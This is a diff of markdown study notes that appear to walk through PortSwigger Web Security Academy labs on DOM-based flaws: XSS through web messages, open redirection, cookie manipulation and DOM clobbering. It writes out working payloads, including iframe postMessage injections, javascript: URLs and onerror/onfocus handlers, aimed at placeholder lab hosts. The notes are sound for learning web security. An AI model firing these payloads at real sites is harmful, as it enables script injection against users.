@@ -2738,7 +2738,7 @@ https://portswigger.net/web-security/dom-based
                             document.getElementById('ads').innerHTML = e.data;
                         })
     ```
-  - Exploit server
+  - Exploit server  
     `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">`
 - DOM XSS using web messages and a **JavaScript URL**
   - Discover > home page > Find script > addEventListener() > The JavaScript contains a flawed indexOf() check that looks for the strings "http:" or "https:" anywhere within the web message. It also contains the sink location.href.
@@ -2750,7 +2750,7 @@ https://portswigger.net/web-security/dom-based
                             }
                         }, false);
     ```
-  - Exploit server
+  - Exploit server  
     `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">`
   - When the iframe loads, the postMessage() method sends the JavaScript payload to the main page. The event listener spots the "http:" string and proceeds to send the payload to the location.href sink, where the print() function is called.
 - DOM XSS using web messages and **JSON.parse**
@@ -2772,17 +2772,35 @@ https://portswigger.net/web-security/dom-based
                                 case "load-channel":
                                     ACMEplayer.element.src = d.url;
     ```
-  - Exploit
+  - Exploit  
     `<iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>`
   - As the second argument specifies that any targetOrigin is allowed for the web message, and the event handler does not contain any form of origin check, the payload is set as the src of the ACMEplayer.element iframe. The print() function is called when the victim loads the page in their browser.
-- DOM-based open redirection
-  - Discover > Find script > The blog post page contains the following link, which returns to the home page of the blog
+- DOM-based **open redirection**
+  - Discover > Find script > The blog post page contains the following link, which returns to the home page of the blog  
     `<a href='#' onclick='returnURL' = /url=https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>`
-  - Append the url of explit server in blog post page
+  - Append the url of explit server in blog post page  
     `https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/`
-- DOM-based cookie manipulation
-- Exploiting DOM clobbering to enable XSS
-- Clobbering DOM attributes to bypass HTML filters  
+- DOM-based **cookie manipulation**
+  - Discover home page cookie > `Cookie: session=lastViewedProduct=https://0a5600d30468956780290893003700bf.web-security-academy.net/product?productId=1`  
+  - Exploit server > deliver to victim  
+    `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">`
+  - The original source of the iframe matches the URL of one of the product pages, except there is a JavaScript payload added to the end. When the iframe loads for the first time, the browser temporarily opens the malicious URL, which is then saved as the value of the lastViewedProduct cookie. The onload event handler ensures that the victim is then immediately redirected to the home page, unaware that this manipulation ever took place. While the victim's browser has the poisoned cookie saved, loading the home page will cause the payload to execute.
+- Exploiting **DOM clobbering** to enable XSS
+  - You can clobber this object using anchor tags. Creating two anchors with the same ID causes them to be grouped in a DOM collection  
+  - Discover loadCommentsWithDomClobbering.js  
+    ```
+    let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
+    let avatarImgHTML = '<img class="avatar" src="' + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + '">';
+    ```
+  - Post first comment `<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`
+  - Post second comment: random  
+  - The injection described above will cause the defaultAvatar variable to be assigned the clobbered property {avatar: ‘cid:"onerror=alert(1)//’} the next time the page is loaded.
+- Clobbering DOM attributes to **bypass HTML filters**
+  - Post first comment `<form id=x tabindex=0 onfocus=print()><input id=attributes>`  
+  - Exploit > Deliver to victim  
+    `<iframe src=https://YOUR-LAB-ID.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)">`
+  - When the iframe is loaded, after a 500ms delay, it adds the #x fragment to the end of the page URL. The delay is necessary to make sure that the comment containing the injection is loaded before the JavaScript is executed. This causes the browser to focus on the element with the ID "x", which is the form we created inside the comment. The onfocus event handler then calls the print() function.
+  
 - DOM XSS in **document.write** sink using source location.search  
   Test random alphanumeric string "hello123"  
   ```<img src="/resources/images/tracker.gif?searchTerms=hello123">```  
